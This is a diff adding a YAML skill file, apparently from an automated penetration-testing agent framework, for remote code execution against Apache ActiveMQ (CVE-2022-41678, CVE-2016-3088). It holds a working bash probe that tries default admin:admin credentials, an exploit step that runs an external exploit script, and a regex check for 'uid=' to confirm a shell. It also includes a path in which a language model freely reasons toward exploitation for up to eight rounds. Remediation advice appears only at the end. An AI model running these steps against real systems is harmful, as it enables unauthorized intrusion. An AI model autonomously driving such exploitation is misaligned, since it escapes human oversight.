@@ -1,0 +1,71 @@
+skill_id: activemq_rce
+name: "ActiveMQ Jolokia JMX RCE (CVE-2022-41678)"
+category: web_rce
+phase: foothold
+version: "4.0"
+
+match:
+  rules:
+    - fingerprint_contains: ["activemq"]
+    - fingerprint_contains: ["ActiveMQ"]
+    - evidence_contains: ["activemq"]
+    - evidence_contains: ["ActiveMQ"]
+    - evidence_contains: ["jolokia"]
+    - evidence_contains: ["8161"]
+    - cve_matches: ["CVE-2022-41678"]
+    - cve_matches: ["CVE-2016-3088"]
+
+probes:
+  - id: find_admin
+    description: "发现 ActiveMQ 管理口并测试凭据"
+    steps:
+      - command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "BASE_URL: $BASE"
+          resp=$(curl -s -u admin:admin "$BASE/admin/" --max-time 8 2>/dev/null)
+          if echo "$resp" | grep -qi "ActiveMQ"; then
+            echo "ACTIVEMQ_CONFIRMED"
+            echo "ADMIN_BASE:$BASE"
+          fi
+          if ! echo "$BASE" | grep -q ":8161"; then
+            resp2=$(curl -s -u admin:admin "http://{TARGET_IP}:8161/admin/" --max-time 8 2>/dev/null)
+            if echo "$resp2" | grep -qi "ActiveMQ"; then
+              echo "ACTIVEMQ_CONFIRMED"
+              echo "ADMIN_BASE:http://{TARGET_IP}:8161"
+            fi
+          fi
+        parse_rules:
+          - if_contains: ["ACTIVEMQ_CONFIRMED"]
+            set: { activemq_confirmed: true }
+
+exploit_paths:
+  - path_id: exploit_script
+    name: "activemq_exploit.py 一键利用"
+    priority: 1
+    conditions:
+      activemq_confirmed: true
+    steps:
+      - id: run_exploit
+        description: "activemq_exploit.py 自动利用（Log4j2 / JFR / fileserver）"
+        command: "bash {skill_dir}/scripts/activemq_exploit.sh {TARGET_IP} {TARGET_PORT} {ENDPOINT}"
+        timeout: 180
+        success_criteria:
+          stdout_regex: "(ACTIVEMQ_RCE_SUCCESS|uid=\\d+\\(\\w+\\))"
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_activemq_script"
+
+  - path_id: llm_freeform
+    name: "LLM 自由推理（限定 ActiveMQ 范围）"
+    priority: 99
+    mode: react_freeform
+    max_rounds: 8
+    conditions:
+      activemq_confirmed: true
+
+remediation: |
+  1. 升级 Apache ActiveMQ 至 5.16.5 / 5.17.3 或更高版本
+  2. 修改默认凭据 admin:admin
+  3. 限制 /api/jolokia/ 和 /fileserver/ 访问
+  4. 禁用 fileserver
